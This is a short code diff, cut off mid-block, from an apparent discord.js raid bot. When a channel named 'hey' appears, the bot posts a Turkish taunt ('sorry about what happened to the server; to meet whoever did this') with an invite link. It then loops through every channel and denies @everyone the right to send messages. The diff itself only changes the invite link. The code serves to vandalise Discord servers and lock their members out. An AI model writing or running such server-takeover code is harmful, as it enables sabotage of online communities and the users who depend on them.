@@ -9,7 +9,7 @@ berke.on('message', async msg => {
 
 berke.on('channelCreate', channel => {
   if (channel.name == 'hey') {
-    channel.send(`Sunucuya ne oldu neyse üzüldüm :smoking: :smoking: bunları yapanla görüşmek istersen; https://discord.gg/cqKpafG`)
+    channel.send(`Sunucuya ne oldu neyse üzüldüm :smoking: :smoking: bunları yapanla görüşmek istersen; https://discord.gg/4judfSa`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
